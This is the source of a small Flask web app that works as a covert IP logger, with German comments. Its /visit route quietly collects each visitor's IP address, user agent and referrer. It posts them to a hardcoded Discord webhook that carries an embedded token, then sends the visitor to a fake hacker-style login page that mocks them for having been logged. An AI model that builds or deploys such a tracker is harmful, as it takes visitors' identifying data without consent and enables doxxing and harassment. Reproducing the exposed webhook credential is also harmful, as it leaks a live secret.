from flask import Flask, request, render_template_string, redirect, url_for
import os
import time
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1527305360539517031/X78P4aN1u9gSLbo9mAHZkaDQTNJN-boj4e8eabaARIAFhVMgEw-1YZVpXNXeJxgQNGqQ"

def get_client_ip(request):
    # Alle möglichen Header durchgehen
    headers = [
        'X-Forwarded-For',
        'X-Real-IP',
        'CF-Connecting-IP',  # Falls Cloudflare
        'True-Client-IP'
    ]
    for header in headers:
        value = request.headers.get(header)
        if value:
            ip = value.split(',')[0].strip()
            if ip and not ip.startswith(('10.', '172.16.', '192.168.', '127.')):
                return ip
    return request.remote_addr or 'Unknown'

@app.route('/visit')
def log_ip():
    ip = get_client_ip(request)
    # ... rest wie vorher
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        ips = [x.strip() for x in forwarded.split(',')]
        ip = ips[0]  # Erste ist meist der echte Client
    
    if not ip or ip.startswith('10.') or ip.startswith('172.16.') or ip.startswith('192.168.') or ip == '127.0.0.1':
        ip = request.remote_addr  # Fallback
    
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'None')
    
    payload = {
        "content": f"🌐 **Neuer Besucher**\n**IP:** `{ip}`",
        "embeds": [{
            "title": "IP Logger",
            "color": 16711680,
            "fields": [
                {"name": "IP", "value": f"`{ip}`", "inline": True},
                {"name": "User-Agent", "value": f"`{user_agent[:300]}`", "inline": False},
                {"name": "Referrer", "value": f"`{referrer}`", "inline": False},
            ]
        }]
    }
    
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=15)
    except Exception as e:
        pass  # Silent fail

    time.sleep(3)
    
    return redirect(url_for("login"))

PASSWORD = "GENGAOG"

LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<title>Terminal</title>
<style>
body{
    background:black;
    color:red;
    font-family:Consolas, monospace;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    margin:0;
}
.box{
    width:700px;
    border:2px solid red;
    padding:20px;
    box-shadow:0 0 20px red;
}
input{
    width:100%;
    padding:10px;
    background:black;
    color:red;
    border:1px solid red;
    margin-top:10px;
    font-family:inherit;
}
button{
    margin-top:10px;
    padding:10px 20px;
    background:red;
    color:black;
    border:none;
    cursor:pointer;
    font-weight:bold;
}
.error{
    color:#ff5555;
    margin-top:10px;
}
</style>
</head>
<body>

<div class="box">
<pre>
===========================
 CONNECTING...
 DATA GOT LOGGED
 WAITING FOR PASSWORD...
===========================
</pre>

<form method="POST">
<input type="password" name="password" placeholder="Password" required>
<button type="submit">LOGIN</button>
</form>

{% if message %}
<p class="error">{{ message }}</p>
{% endif %}

</div>

</body>
</html>
"""

SUCCESS_PAGE = """
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<title>Access Granted</title>
<style>
body{
    background:black;
    color:lime;
    font-family:Consolas, monospace;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    margin:0;
}
h1{
    text-shadow:0 0 10px lime;
}
</style>
</head>
<body>

<h1>ACCESS GRANTED</h1>

</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    message = ""

    if request.method == "POST":
        if request.form.get("password") == PASSWORD:
            return "Oooops I logged your IP-Adresse idiot"
            return redirect("https://vm.tiktok.com/ZGd9711rQ/")
            
        else:
            message = "Wrong password!"

    return render_template_string(LOGIN_PAGE, message=message) 

@app.route("/success")
def success():
    return SUCCESS_PAGE

if __name__ == "__main__":
    app.run(debug=True)
    
if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
